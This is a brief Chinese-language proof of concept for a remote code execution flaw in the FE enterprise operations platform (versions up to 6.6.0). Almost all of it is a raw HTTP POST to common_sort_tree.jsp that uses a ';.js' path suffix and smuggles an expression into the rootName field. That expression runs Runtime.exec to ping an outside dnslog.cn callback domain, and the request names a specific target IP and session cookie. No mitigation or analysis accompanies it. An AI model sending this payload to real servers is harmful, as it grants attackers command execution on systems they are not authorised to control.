# 飞企互联 FE 企业运营管理平台 common_sort_tree.jsp远程代码执行漏洞

    影响版本:version <= 6.6.0

```
POST /common/common_sort_tree.jsp;.js HTTP/1.1
Host: 110.53.162.145:9090
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=6FFADE422CCC53EF93E250BD6FDFDC52
Connection: close
Content-Length: 81

rootName={%Thread.@java.lang.Runtime@getRuntime().exec('ping jv02f8.dnslog.cn')%}
```
